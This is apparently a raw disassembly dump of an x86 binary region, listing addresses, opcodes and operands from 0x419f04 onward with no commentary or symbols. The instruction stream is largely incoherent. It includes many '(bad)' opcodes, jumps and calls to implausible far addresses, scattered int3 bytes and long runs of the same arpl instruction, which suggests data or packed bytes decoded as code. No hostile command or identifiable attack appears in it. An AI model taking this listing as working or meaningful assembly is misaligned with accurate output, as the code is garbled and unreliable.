  419f04:	fiadd  WORD PTR [ebp+0x74]
  419f07:	inc    esp
  419f08:	loopne 0x419eec
  419f0a:	test   DWORD PTR [eax],0xc03108ee
  419f10:	dec    eax
  419f11:	and    DWORD PTR [ecx+0x4f8c5b4d],ecx
  419f17:	sbb    BYTE PTR [eax+0x6a7507ba],cl
  419f1d:	mov    WORD PTR [ebx-0x8],es
  419f20:	call   0xcaaaf6
	...
  419f31:	add    BYTE PTR [eax],al
  419f33:	stos   DWORD PTR es:[edi],eax
  419f34:	add    DWORD PTR [ecx+0x438c2b55],ecx
  419f3a:	adc    dl,bl
  419f3c:	ret    0xb817
  419f3f:	bound  eax,QWORD PTR ds:0xfd080000
  419f45:	mov    BYTE PTR [ebp+0xb],cl
  419f48:	mov    WORD PTR [edi],cs
  419f4a:	mov    DWORD PTR [esi-0x4ba76a3],ebp
  419f50:	sbb    eax,DWORD PTR [ebx-0x4]
  419f53:	outs   dx,BYTE PTR ds:[esi]
  419f54:	or     DWORD PTR [ecx],esi
  419f56:	sar    al,0x8
  419f59:	jmp    0x8986d011
  419f5e:	in     eax,0x3e
  419f60:	inc    esp
  419f61:	int3   
  419f62:	int3   
  419f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f64:	push   eax
  419f65:	int3   
  419f66:	int3   
  419f67:	lahf   
  419f68:	push   eax
  419f69:	int3   
  419f6a:	int3   
  419f6b:	xchg   edi,eax
  419f6c:	push   eax
  419f6d:	int3   
  419f6e:	int3   
  419f6f:	push   ss
  419f70:	mov    esp,gs
  419f72:	add    edi,0xfffffffc
  419f75:	les    eax,FWORD PTR [ebp-0x55]
  419f78:	add    al,0x30
  419f7a:	add    BYTE PTR [ebx-0x13],ah
  419f7d:	add    eax,DWORD PTR [ebx]
  419f7f:	and    eax,DWORD PTR ds:0xc62efc9f
  419f85:	dec    DWORD PTR [edi+0x7b]
  419f88:	mov    bl,0xfb
  419f8a:	inc    DWORD PTR [ebx+eax*4-0x3615f73c]
  419f91:	repz push 0x23
  419f94:	mov    WORD PTR [ebx-0x8],cs
	...
  419fa3:	add    BYTE PTR [eax],al
  419fa5:	add    BYTE PTR [edx],dl
  419fa7:	mov    WORD PTR [ebx],ss
  419fa9:	fmul   QWORD PTR [esi]
  419fab:	(bad)  
  419fac:	dec    DWORD PTR [edx+0x6a4fb5a1]
  419fb2:	arpl   WORD PTR [esi+0x53],bx
  419fb5:	hlt    
  419fb6:	add    BYTE PTR [edx],bh
  419fb8:	push   ebx
  419fb9:	inc    ecx
  419fba:	arpl   WORD PTR [edx-0x3b692bc5],ax
  419fc0:	(bad)  
  419fc1:	jmp    FWORD PTR [esi+0x6302b806]
  419fc7:	add    eax,0x8ab9eb00
  419fcc:	or     eax,DWORD PTR [eax]
  419fce:	popa   
  419fcf:	(bad)  
  419fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fd3:	push   ebp
  419fd4:	push   0x4b600
  419fd9:	push   0x400363
  419fde:	call   0xa29773db
  419fe3:	add    eax,0x363c27f
  419fe8:	add    BYTE PTR [eax],al
  419fea:	xchg   ecx,eax
  419feb:	ins    DWORD PTR es:[edi],dx
  419fec:	sahf   
  419fed:	(bad)  
  419fee:	fcomp  QWORD PTR [esi-0x7f]
  419ff1:	les    esp,FWORD PTR [edi-0x63]
  419ff4:	add    BYTE PTR [edx],al
  419ff6:	and    eax,DWORD PTR ds:0x561002b
  419ffc:	add    BYTE PTR [ebx+0x4153396e],cl
  41a002:	arpl   WORD PTR [edx],bp
  41a004:	enter  0x5e89,0x9
  41a008:	push   esi
  41a009:	inc    ecx
	...
  41a016:	add    BYTE PTR [eax],al
  41a018:	add    BYTE PTR [ebx-0x76],ah
  41a01b:	adc    eax,DWORD PTR [esi*1-0x3dae003c]
  41a022:	cmp    DWORD PTR [ebx+0x41],edx
  41a025:	arpl   WORD PTR [ebp-0x4b6cb278],si
  41a02b:	out    0x9d,eax
  41a02d:	jg     0x41a08d
  41a02f:	std    
  41a030:	sbb    DWORD PTR [edi-0x68ea76ef],0xffffffb8
  41a037:	add    BYTE PTR ds:[eax-0x48],ah
  41a03b:	pop    es
  41a03c:	mov    DWORD PTR [esi+0x4b55896d],esi
  41a042:	pop    esi
  41a043:	loop   0x419fd0
  41a045:	inc    esi
  41a046:	rol    al,0xcc
  41a049:	pop    ss
  41a04a:	push   ecx
  41a04b:	int3   
  41a04c:	int3   
  41a04d:	xchg   esi,eax
  41a04e:	mov    ch,ah
  41a050:	mov    ebx,DWORD PTR [esi+0x5f45390d]
  41a056:	rol    BYTE PTR [ebx+ecx*4],cl
  41a059:	sahf   
  41a05a:	or     eax,0x20805e9
  41a05f:	mov    DWORD PTR [ebp+0x67],eax
  41a062:	rol    al,0xcc
  41a065:	pop    ds
  41a066:	push   ecx
  41a067:	int3   
  41a068:	int3   
  41a069:	pop    ss
  41a06a:	push   ecx
  41a06b:	int3   
  41a06c:	int3   
  41a06d:	xchg   esi,eax
  41a06e:	mov    ch,ah
  41a070:	add    DWORD PTR [edi],0x31
  41a073:	lds    eax,FWORD PTR [ebp-0x11]
  41a076:	add    al,0x70
  41a078:	add    DWORD PTR [ebx-0x76],esp
  41a07b:	inc    ebx
  41a07c:	or     BYTE PTR [eax],al
	...
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	jmp    0x893d:0x268bd7c7
  41a093:	push   ebp
  41a094:	pop    ebx
  41a095:	add    cl,BYTE PTR [edi+0x3c]
  41a098:	fidiv  DWORD PTR [edi+0x65268bdf]
  41a09e:	or     eax,0x88f92bb7
  41a0a3:	push   ebp
  41a0a4:	ret    
  41a0a5:	pop    DWORD PTR [edx+ecx*1+0x4b]
  41a0a9:	mov    WORD PTR [ebx-0x18],es
  41a0ac:	or     edi,ecx
  41a0ae:	add    BYTE PTR [eax+0x63],al
  41a0b1:	mov    cl,BYTE PTR [ebx]
  41a0b3:	cld    
  41a0b4:	ss (bad) 
  41a0b6:	call   DWORD PTR [eax+0x7b]
  41a0b9:	int    0xf8
  41a0bb:	(bad)  
  41a0bc:	jl     0x41a03f
  41a0be:	les    ecx,FWORD PTR [eax]
  41a0c0:	jmp    0xffed:0x236aefc7
  41a0c7:	das    
  41a0c8:	arpl   WORD PTR ds:0x6d30068,ax
  41a0ce:	add    BYTE PTR [edx+0x63],ch
  41a0d1:	pop    esp
  41a0d2:	push   ebx
  41a0d3:	lock fcmovb st,st(2)
  41a0d6:	jecxz  0x41a063
  41a0d8:	scas   al,BYTE PTR es:[edi]
  41a0d9:	mov    DWORD PTR gs:[edx-0x69],eax
  41a0dd:	mov    ch,0x88
  41a0df:	dec    ebp
  41a0e0:	imul   esi,DWORD PTR [esi-0x47b8aa78],0xffffffe7
  41a0e7:	shl    DWORD PTR [esi],0x5d
  41a0ea:	std    
  41a0eb:	and    DWORD PTR [edi],0xa
  41a0ee:	lds    eax,FWORD PTR [ebp+0x0]
	...
  41a0fd:	add    BYTE PTR [eax],al
  41a0ff:	clts   
  41a101:	add    BYTE PTR [eax],al
  41a103:	arpl   WORD PTR [eax+0x7],si
  41a106:	mov    ebx,DWORD PTR [esi+0x62c08151]
  41a10c:	mov    es,WORD PTR [ebx-0xc]
  41a10f:	call   0xb45180de
  41a114:	mov    dh,0x5
  41a116:	cmp    DWORD PTR [esi-0x17a68eaf],ecx
  41a11c:	ret    0x83e7
  41a11f:	pop    ebx
  41a120:	icebp  
  41a121:	push   DWORD PTR [ebx+0x26]
  41a124:	nop
  41a125:	dec    ebx
  41a126:	call   0x51800b
  41a12b:	aaa    
  41a12c:	sbb    DWORD PTR [ecx+0x4290cb55],ecx
  41a132:	adc    al,bl
  41a134:	retf   0x8bdf
  41a137:	adc    bl,BYTE PTR [ecx]
  41a139:	mov    eax,DWORD PTR [ebx+esi*2+0x5c]
  41a13d:	mov    DWORD PTR [ebp-0x7d],ecx
  41a140:	sbb    dl,dl
  41a142:	not    DWORD PTR [edx]
  41a144:	sbb    DWORD PTR [ecx-0x52f37cab],ecx
  41a14a:	inc    edx
  41a14b:	aas    
  41a14c:	mov    ch,0x88
  41a14e:	inc    ebp
  41a14f:	mov    edx,DWORD PTR [eax-0x329ff7b5]
  41a155:	adc    edx,DWORD PTR [ecx-0x28]
  41a158:	mov    dl,0xe7
  41a15a:	mov    esp,DWORD PTR [esi+0x67420161]
  41a160:	mov    ch,0xe7
  41a162:	push   ebp
	...
  41a16f:	add    BYTE PTR [eax],al
  41a171:	add    BYTE PTR [esi+0x5c],cl
  41a174:	std    
  41a175:	sbb    DWORD PTR [edi],0x9
  41a178:	mov    DWORD PTR [ebp+0x4b],ecx
  41a17b:	mov    BYTE PTR [edi-0x183615d8],bh
  41a181:	jmp    0x41a154
  41a183:	(bad)  
  41a184:	push   ebx
  41a185:	in     al,0x91
  41a187:	ins    DWORD PTR es:[edi],dx
  41a188:	push   cs
  41a189:	cld    
  41a18a:	sbb    al,0x5c
  41a18c:	add    esp,0x323ed5f
  41a192:	mov    ds:0xaefc9f05,eax
  41a197:	(bad)  
  41a198:	dec    DWORD PTR [edi+0xb]
  41a19b:	nop
  41a19c:	cli    
  41a19d:	push   esp
  41a19f:	xchg   esp,eax
  41a1a1:	or     dl,bl
  41a1a3:	rcr    ebx,0x83
  41a1a6:	es pop ebp
  41a1a8:	push   ebx
  41a1a9:	inc    ecx
  41a1aa:	arpl   WORD PTR ds:0x9e80a73,ax
  41a1b0:	lock push ebp
  41a1b2:	and    al,BYTE PTR ds:0x392eff4f
  41a1b8:	cmp    DWORD PTR ds:0x3eb1bb,0x6a1bd263
  41a1c2:	and    ebp,ebp
  41a1c4:	jmp    FWORD PTR [edi]
  41a1c6:	arpl   WORD PTR ds:0xb69f5589,ax
  41a1cc:	mov    BYTE PTR [ebp-0x7d],al
  41a1cf:	(bad)
  41a1d3:	pop    esp
  41a1d4:	push   ebx
  41a1d5:	lock add BYTE PTR [eax],al
	...
  41a1e4:	add    al,al
  41a1e6:	xor    BYTE PTR [ebx+0x41],dl
  41a1e9:	arpl   WORD PTR [eax+0x13],si
  41a1ec:	push   0x23
  41a1ee:	in     eax,dx
  41a1ef:	jmp    FWORD PTR [edi]
  41a1f1:	arpl   WORD PTR ds:0xb6675589,ax
  41a1f7:	imul   eax,DWORD PTR [eax],0xa3efb15c
  41a1fd:	das    
  41a1fe:	mov    cl,0x3e
  41a200:	add    al,ah
  41a202:	sbb    ah,dl
  41a204:	push   ebp
  41a205:	mov    ds:0x56750005,al
  41a20a:	out    dx,eax
  41a20b:	aas    
  41a20c:	push   0x1563
  41a211:	fadd   st,st(0)
  41a213:	sti    
  41a214:	push   eax
  41a215:	mov    ecx,0x1355fd05
  41a21a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a21b:	aam    0x55
  41a21d:	mov    ds:0x74d8905,al
  41a222:	lea    ecx,[ebx-0x28]
  41a225:	fdiv   DWORD PTR [eax+0x3da68bd7]
  41a22b:	add    DWORD PTR [edx+0x37],eax
  41a22e:	mov    WORD PTR [ebx-0x20],es
  41a231:	fmul   st,st(0)
  41a233:	sti    
  41a234:	push   ecx
  41a235:	fdiv   DWORD PTR [eax+0x320252e3]
  41a23b:	push   ebx
  41a23c:	inc    ecx
  41a23d:	arpl   WORD PTR [ebp+0x5acf95e7],si
  41a243:	std    
  41a244:	sbb    DWORD PTR [edi+0x4d8909],0x0
	...
  41a257:	add    bl,al
  41a259:	xchg   BYTE PTR [edi+0x563a4],dh
  41a25f:	add    BYTE PTR [edi],dh
  41a261:	pop    ds
  41a262:	mov    DWORD PTR [ebp-0x3d],edx
  41a265:	mov    es,WORD PTR [ebx-0x28]
  41a268:	pusha  
  41a269:	xchg   DWORD PTR [eax-0x78fa9d00],esp
  41a26f:	inc    ebp
  41a270:	jg     0x41a200
  41a272:	dec    ebx
  41a273:	loopne 0x41a24d
  41a275:	lock rcl DWORD PTR [ebp+0x22],cl
  41a279:	add    eax,0x8c2f5129
  41a27e:	adc    eax,DWORD PTR [edx*1+0x5fa0ffc4]
  41a285:	mov    bl,0x3e
  41a287:	add    BYTE PTR [ebx-0x512bf472],dh
  41a28d:	(bad)  
  41a28e:	call   DWORD PTR [eax-0x28]
  41a291:	scas   eax,DWORD PTR es:[edi]
  41a292:	jmp    0x41a2e6
  41a294:	cmp    ebx,edx
  41a296:	stc    
  41a297:	(bad)  
  41a298:	cmp    al,0x86
  41a29a:	les    ecx,FWORD PTR [eax+ebp*8]
  41a29d:	mov    edi,0x315e8bdf
  41a2a2:	push   ebx
  41a2a3:	inc    ecx
  41a2a4:	arpl   WORD PTR [esi],ax
  41a2a6:	dec    eax
  41a2a7:	sub    dl,ch
  41a2a9:	pop    es
  41a2aa:	adc    al,0x56
  41a2ac:	mov    ds:0xb3d8105,al
  41a2b1:	mov    al,0x3e
  41a2b3:	add    BYTE PTR [ebx-0x30],ah
  41a2b6:	sub    cl,BYTE PTR [ebx+0x41533156]
	...
  41a2c8:	add    BYTE PTR [eax],al
  41a2ca:	add    BYTE PTR [ebx-0x49],ah
  41a2cd:	sahf   
  41a2ce:	adc    al,0x95
  41a2d0:	(bad)  
  41a2d1:	dec    DWORD PTR [edi-0x28]
  41a2d4:	pop    es
  41a2d5:	lock push ebp
  41a2d7:	and    al,BYTE PTR ds:0x595be84f
  41a2dd:	std    
  41a2de:	jmp    eax
  41a2e0:	inc    eax
  41a2e1:	or     al,0x8b
  41a2e3:	outs   dx,BYTE PTR ds:[esi]
  41a2e4:	xor    DWORD PTR [ebx+0x41],edx
  41a2e7:	arpl   WORD PTR [edi+0x59ba49e7],si
  41a2ed:	std    
  41a2ee:	and    DWORD PTR [edi+0x3b61e900],0x11
  41a2f5:	add    DWORD PTR [eax+0x63],eax
  41a2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2f9:	cld    
  41a2fa:	push   ebp
  41a2fb:	and    al,BYTE PTR ds:0x5c37e850
  41a301:	std    
  41a302:	jmp    eax
  41a304:	inc    eax
  41a305:	or     BYTE PTR [ecx+0xd893126],cl
  41a30b:	(bad)  
  41a30c:	scas   eax,DWORD PTR es:[edi]
  41a30d:	add    BYTE PTR ds:[edx],dl
  41a310:	mov    ss,WORD PTR [ebx-0x20]
  41a313:	ret    0x5330
  41a316:	inc    ecx
  41a317:	arpl   WORD PTR [edx+eax*2],ax
  41a31a:	sub    BYTE PTR [ebx-0x490ff474],dh
  41a320:	(bad)  
  41a321:	call   DWORD PTR [eax+0x3b]
  41a324:	sub    esp,edi
  41a326:	(bad)  
  41a327:	cmp    al,0x85
  41a329:	les    ecx,FWORD PTR [eax+ebp*8]
  41a32c:	repnz out dx,eax
  41a32e:	push   ebp
	...
  41a33b:	add    BYTE PTR [eax],al
  41a33d:	add    BYTE PTR [edx-0x6c3d80fb],ah
  41a343:	mov    ah,0xfe
  41a345:	(bad)  
  41a346:	jmp    0x8b05:0xa2561bf2
  41a34d:	inc    ebp
  41a34e:	or     esi,DWORD PTR [esi-0x86bf97]
  41a354:	mov    BYTE PTR ds:0x3eaf5f,cl
  41a35a:	xchg   edx,eax
  41a35b:	pop    eax
  41a35c:	push   ebx
  41a35d:	aam    0xfb
  41a35f:	fs stc 
  41a361:	jmp    esp
  41a363:	popf   
  41a364:	(bad)  
  41a365:	jmp    DWORD PTR [ebx+0x5]
  41a368:	mov    ebp,esp
  41a36a:	ss inc ebx
  41a36c:	add    al,0x0
  41a36e:	lahf   
  41a36f:	dec    ecx
  41a370:	int3   
  41a371:	int3   
  41a372:	xchg   edi,eax
  41a373:	dec    ecx
  41a374:	int3   
  41a375:	int3   
  41a376:	push   ss
  41a377:	mov    esp,gs
  41a379:	mov    ebx,DWORD PTR [esi]
  41a37b:	or     eax,0xbaaf4089
  41a380:	ror    ah,0x97
  41a383:	dec    ecx
  41a384:	int3   
  41a385:	int3   
  41a386:	ss mov esp,gs
  41a389:	push   ebx
  41a38a:	sub    eax,0x833d88b0
  41a38f:	mov    dl,0x3e
  41a391:	add    al,bl
  41a393:	cli    
  41a394:	jmp    0x41a3eb
  41a396:	and    al,BYTE PTR ds:0xb29b3589
  41a39c:	add    BYTE PTR ds:[edi+esi*4],cl
  41a3a0:	pop    eax
  41a3a1:	pop    ebp
	...
  41a3ae:	add    BYTE PTR [eax],al
  41a3b0:	add    BYTE PTR [eax-0x493333b7],ah
  41a3b6:	mov    esp,gs
  41a3b8:	push   ecx
  41a3b9:	retf   
  41a3ba:	rol    DWORD PTR [eax],0x40
  41a3bd:	arpl   WORD PTR [esi+0x5a255fc],sp
  41a3c3:	push   eax
  41a3c4:	call   0x3f00d8
  41a3c9:	loopne 0x41a40b
  41a3cb:	or     BYTE PTR [ecx+0x4d8959a6],cl
  41a3d1:	pop    ebx
  41a3d2:	mov    dh,0x69
  41a3d4:	add    al,ch
  41a3d6:	icebp  
  41a3d7:	pop    ss
  41a3d8:	push   esi
  41a3d9:	mov    ds:0xb6ff5205,al
  41a3de:	pop    ecx
  41a3df:	mov    ebp,esp
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	inc    esp
  41a3e3:	int3   
  41a3e4:	int3   
  41a3e5:	xchg   esi,eax
  41a3e6:	mov    esp,gs
  41a3e8:	add    DWORD PTR [edi],0x21
  41a3eb:	lds    eax,FWORD PTR [ebp-0x15]
  41a3ee:	add    al,0x0
  41a3f0:	add    BYTE PTR [ebx+0x40],ah
  41a3f3:	inc    ebx
  41a3f4:	fcomp  QWORD PTR [ebx+0x5]
  41a3f7:	add    BYTE PTR [eax],al
  41a3f9:	pushf  
  41a3fa:	shl    ebx,0x1
  41a3fd:	arpl   WORD PTR ds:0x591ec700,ax
  41a403:	add    BYTE PTR [eax],al
  41a405:	arpl   WORD PTR ds:0x4bf45c5,ax
  41a40b:	add    BYTE PTR [eax],al
  41a40d:	arpl   WORD PTR [ebx+ecx*2-0xff625f8],cx
  41a414:	push   ebp
	...
  41a421:	add    BYTE PTR [eax],al
  41a423:	add    BYTE PTR [edx],ah
  41a425:	add    eax,0x578ca9e8
  41a42a:	std    
  41a42b:	mov    eax,ds:0x3eb193
  41a430:	ds pop eax
  41a432:	std    
  41a433:	add    BYTE PTR [ebx-0x2f],ah
  41a436:	or     eax,edi
  41a438:	pop    esi
  41a439:	pop    ebp
  41a43a:	push   ebx
  41a43b:	inc    ecx
  41a43c:	arpl   WORD PTR ds:0x6c630000,ax
  41a442:	or     al,bh
  41a444:	pop    bp
  41a446:	push   ebx
  41a447:	inc    ecx
  41a448:	arpl   WORD PTR [eax+eax*1],ax
  41a44b:	add    BYTE PTR [ebx-0x7e],ah
  41a44e:	cmp    esi,eax
  41a450:	scas   al,BYTE PTR es:[edi]
  41a451:	(bad)  
  41a452:	(bad)  
  41a453:	push   DWORD PTR [esi+0x3b05c50b]
  41a459:	mov    cl,0x3e
  41a45b:	add    BYTE PTR [ebx+0x5],ah
  41a45e:	add    BYTE PTR [eax],al
  41a460:	loopne 0x41a47a
  41a462:	clc    
  41a463:	push   ebp
  41a464:	mov    ds:0x66750005,al
  41a469:	jmp    0x41a46a
  41a46b:	(bad)  
  41a46c:	jbe    0x41a4b3
  41a46e:	push   ebx
  41a46f:	inc    ecx
  41a470:	arpl   WORD PTR [edx+0x5a255f0],sp
  41a476:	mov    DWORD PTR ds:0x3eb0f3,ecx
  41a47c:	fcmove st,st(0)
  41a47e:	out    0x8b,eax
  41a480:	dec    esi
  41a481:	push   ebp
  41a482:	push   ebx
  41a483:	inc    ecx
  41a484:	arpl   WORD PTR [edx+0xe843],cx
	...
  41a496:	add    BYTE PTR [eax-0x3d],ah
  41a499:	cmp    ecx,DWORD PTR [ecx+0x4d896d26]
  41a49f:	mov    ebx,0x16dc0b8c
  41a4a4:	(bad)  
  41a4a5:	jmp    DWORD PTR [edi+0x13]
  41a4a8:	add    al,BYTE PTR [eax+0x0]
  41a4ab:	lods   al,BYTE PTR ds:[esi]
  41a4ac:	lock mov edi,0xa1052255
  41a4b2:	cld    
  41a4b3:	ss (bad) 
  41a4b5:	inc    esi
  41a4b7:	pop    esi
  41a4b8:	or     DWORD PTR [esi+0x41],edx
  41a4bb:	arpl   ax,dx
  41a4bd:	add    BYTE PTR [eax+0x63],al
  41a4c0:	in     eax,dx
  41a4c1:	pop    edi
  41a4c2:	add    esp,DWORD PTR [ebx]
  41a4c4:	add    eax,0xb0771589
  41a4c9:	add    BYTE PTR ds:[ecx],dl
  41a4cc:	ins    DWORD PTR es:[edi],dx
  41a4cd:	ret    0x64f7
  41a4d0:	push   esi
  41a4d1:	add    esp,0x5608a26b
  41a4d7:	mov    ds:0x5b15fd05,al
  41a4dc:	scas   eax,DWORD PTR es:[edi]
  41a4dd:	add    BYTE PTR ds:[eax],al
  41a4e0:	std    
  41a4e1:	push   ebp
  41a4e2:	inc    ecx
  41a4e3:	arpl   WORD PTR [esp+ecx*1+0x5005a256],sp
  41a4ea:	call   0x3efbe6
  41a4ef:	loopne 0x41a531
  41a4f1:	add    al,0x89
  41a4f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4f4:	push   ebp
  41a4f5:	mov    DWORD PTR [ebp+0x13],ecx
  41a4f8:	mov    ah,0xe7
  41a4fa:	aad    0x0
	...
  41a508:	add    BYTE PTR [eax],al
  41a50a:	or     eax,0x1f83fd56
  41a50f:	add    DWORD PTR [ecx-0x3b690c],esp
  41a515:	mov    cl,BYTE PTR [esi+0x636a5255]
  41a51b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a51c:	hlt    
  41a51d:	push   ebp
  41a51e:	mov    ds:0xffe85005,al
  41a523:	dec    ebp
  41a524:	std    
  41a525:	jmp    eax
  41a527:	inc    eax
  41a528:	or     al,0x8b
  41a52a:	push   ds
  41a52b:	push   ebp
  41a52c:	xchg   DWORD PTR [ebp-0x3d],ecx
  41a52f:	mov    DWORD PTR [ebx-0x4],edx
  41a532:	js     0x41a4e4
  41a534:	out    dx,eax
  41a535:	jae    0x41a550
  41a537:	mov    al,BYTE PTR [ebx-0x20]
  41a53a:	adc    ecx,DWORD PTR [edx+0x6d12dc4b]
  41a540:	scas   al,BYTE PTR es:[edi]
  41a541:	sti    
  41a542:	pushf  
  41a543:	push   ebp
  41a544:	add    esp,0x5600a26b
  41a54a:	and    al,BYTE PTR ds:0xaf631589
  41a550:	add    BYTE PTR ds:[ecx],dl
  41a553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a554:	or     al,0x56
  41a556:	and    al,BYTE PTR ds:0xb4874501
  41a55c:	mov    BYTE PTR ds:0x3eaf6f,cl
  41a562:	pusha  
  41a563:	ret    0x51fb
  41a566:	dec    ebx
  41a567:	cmp    eax,0x894cfff7
  41a56c:	les    ecx,FWORD PTR [eax+eax*1]
	...
  41a57b:	add    BYTE PTR [eax],al
  41a57d:	fdivr  DWORD PTR [edx+0x319603f3]
  41a583:	add    DWORD PTR [ebp+0x3f],edx
  41a586:	jg     0x41a5db
  41a588:	in     al,0xd8
  41a58a:	retf   0x3fb
  41a58d:	sahf   
  41a58e:	xor    DWORD PTR [edi+0x4b811f45],eax
  41a594:	loopne 0x41a5de
  41a596:	add    al,BYTE PTR [eax]
  41a598:	push   esi
  41a599:	mov    ds:0x34d8705,al
  41a59e:	popa   
  41a59f:	sahf   
  41a5a0:	(bad)  
  41a5a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5a2:	dec    ebp
  41a5a3:	add    BYTE PTR [eax],al
  41a5a5:	arpl   WORD PTR ds:0xbad809e9,ax
  41a5ab:	test   DWORD PTR [ebx+0x55870a21],0xf84380db
  41a5b5:	cwde   
  41a5b6:	retf   0x73ef
  41a5b9:	mov    eax,DWORD PTR [eax-0x39d10bf5]
  41a5bf:	inc    DWORD PTR [edx]
  41a5c1:	cs dec ebp
  41a5c3:	mov    DWORD PTR [ecx],edx
  41a5c5:	pusha  
  41a5c6:	mov    edx,0xbab7a1f7
  41a5cb:	add    BYTE PTR ds:[eax-0x36],ah
  41a5cf:	test   DWORD PTR [ecx-0x7b47f8d],0x3e746e2
  41a5d9:	arpl   WORD PTR ds:0xba8f1589,ax
  41a5df:	add    BYTE PTR ds:[eax],al
	...
  41a5ee:	add    BYTE PTR [eax],al
  41a5f0:	pusha  
  41a5f1:	mov    edx,0xa66933f7
  41a5f6:	hlt    
  41a5f7:	push   ebp
  41a5f8:	and    al,BYTE PTR ds:0x7e6b4501
  41a5fe:	or     bl,ch
  41a600:	adc    al,0x7e
  41a602:	sub    esp,esp
  41a604:	scas   al,BYTE PTR es:[edi]
  41a605:	(bad)  
  41a606:	dec    DWORD PTR [eax+0x4153658e]
  41a60c:	arpl   WORD PTR [eax],bx
  41a60e:	(bad)  
  41a60f:	mov    DWORD PTR [esi+0x2d],esi
  41a612:	push   ebx
  41a613:	inc    ecx
  41a614:	arpl   WORD PTR [eax],bx
  41a616:	(bad)  
  41a617:	mov    DWORD PTR [esi+0x61],ecx
  41a61a:	push   ebx
  41a61b:	inc    ecx
  41a61c:	arpl   WORD PTR [ebp+0x4e],bx
  41a61f:	neg    DWORD PTR [esp+edx*2]
  41a622:	mov    ecx,DWORD PTR ds:0x3eba84
  41a628:	fcmovb st,st(1)
  41a62a:	idiv   DWORD PTR [ecx+0x400763]
  41a630:	loop   0x41a68f
  41a632:	add    BYTE PTR [edx],al
  41a634:	arpl   WORD PTR ds:0x1feb5589,ax
  41a63a:	iret   
  41a63b:	mov    DWORD PTR [esi+0x5d],ecx
  41a63e:	push   ebx
  41a63f:	inc    ecx
  41a640:	arpl   WORD PTR [esi+0x52255e8],sp
  41a646:	push   eax
  41a647:	call   0x3ef5b3
  41a64c:	loopne 0x41a696
  41a64e:	add    al,0x8b
  41a650:	outs   dx,BYTE PTR ds:[esi]
  41a651:	pop    ecx
  41a652:	push   ebx
  41a653:	inc    ecx
	...
  41a660:	add    BYTE PTR [eax],al
  41a662:	add    BYTE PTR [ebx-0x4a],ah
  41a665:	out    0xd5,eax
  41a667:	test   eax,0xa385fd53
  41a66c:	fld    DWORD PTR [ebx]
  41a66e:	xor    esp,DWORD PTR [ebx+0x3e8b2a5f]
  41a674:	imul   edx,DWORD PTR [ebx+0x41],0x4c48863
  41a67b:	loopne 0x41a68e
  41a67d:	clc    
  41a67e:	push   ebp
  41a67f:	and    al,BYTE PTR ds:0xa66a7400
  41a685:	aam    0x55
  41a687:	and    al,BYTE PTR ds:0x93f4487
  41a68d:	call   0xfd9504ef
  41a692:	mov    ebp,DWORD PTR [esi-0x7]
  41a695:	push   ebp
  41a696:	inc    ecx
  41a697:	arpl   WORD PTR [edi+0x7f2333c0],si
  41a69d:	jecxz  0x41a6fc
  41a69f:	and    BYTE PTR [edx-0x34],al
  41a6a2:	int3   
  41a6a3:	arpl   WORD PTR ds:0x5630000,ax
  41a6a9:	add    BYTE PTR [eax],al
  41a6ab:	arpl   WORD PTR ds:0x5630000,ax
  41a6b1:	add    BYTE PTR [eax],al
  41a6b3:	arpl   WORD PTR ds:0x5630000,ax
  41a6b9:	add    BYTE PTR [eax],al
  41a6bb:	arpl   WORD PTR ds:0x5630000,ax
  41a6c1:	add    BYTE PTR [eax],al
  41a6c3:	arpl   WORD PTR ds:0x0,ax
	...
  41a6d5:	add    BYTE PTR [ebx+0x5],ah
  41a6d8:	add    BYTE PTR [eax],al
  41a6da:	arpl   WORD PTR ds:0x5630000,ax
  41a6e0:	add    BYTE PTR [eax],al
  41a6e2:	arpl   WORD PTR ds:0x5630000,ax
  41a6e8:	add    BYTE PTR [eax],al
  41a6ea:	arpl   WORD PTR ds:0x5630000,ax
  41a6f0:	add    BYTE PTR [eax],al
  41a6f2:	arpl   WORD PTR ds:0x5630000,ax
  41a6f8:	add    BYTE PTR [eax],al
  41a6fa:	arpl   WORD PTR ds:0x5630000,ax
  41a700:	add    BYTE PTR [eax],al
  41a702:	arpl   WORD PTR ds:0x5630000,ax
  41a708:	add    BYTE PTR [eax],al
  41a70a:	arpl   WORD PTR ds:0x5630000,ax
  41a710:	add    BYTE PTR [eax],al
  41a712:	arpl   WORD PTR ds:0x5630000,ax
  41a718:	add    BYTE PTR [eax],al
  41a71a:	arpl   WORD PTR ds:0x5630000,ax
  41a720:	add    BYTE PTR [eax],al
  41a722:	arpl   WORD PTR ds:0x5630000,ax
  41a728:	add    BYTE PTR [eax],al
  41a72a:	arpl   WORD PTR ds:0x5630000,ax
  41a730:	add    BYTE PTR [eax],al
  41a732:	arpl   WORD PTR ds:0x5630000,ax
	...
  41a748:	add    BYTE PTR [ebx+0x5],ah
  41a74b:	add    BYTE PTR [eax],al
  41a74d:	arpl   WORD PTR ds:0x5630000,ax
  41a753:	add    BYTE PTR [eax],al
  41a755:	arpl   WORD PTR ds:0x5630000,ax
  41a75b:	add    BYTE PTR [eax],al
  41a75d:	arpl   WORD PTR ds:0x5630000,ax
  41a763:	add    BYTE PTR [eax],al
  41a765:	arpl   WORD PTR ds:0x5630000,ax
  41a76b:	add    BYTE PTR [eax],al
  41a76d:	arpl   WORD PTR ds:0x5630000,ax
  41a773:	add    BYTE PTR [eax],al
  41a775:	arpl   WORD PTR ds:0x5630000,ax
  41a77b:	add    BYTE PTR [eax],al
  41a77d:	arpl   WORD PTR ds:0x5630000,ax
  41a783:	add    BYTE PTR [eax],al
  41a785:	arpl   WORD PTR ds:0x5630000,ax
  41a78b:	add    BYTE PTR [eax],al
  41a78d:	arpl   WORD PTR ds:0x5630000,ax
  41a793:	add    BYTE PTR [eax],al
  41a795:	arpl   WORD PTR ds:0x5630000,ax
  41a79b:	add    BYTE PTR [eax],al
  41a79d:	arpl   WORD PTR ds:0x5630000,ax
  41a7a3:	add    BYTE PTR [eax],al
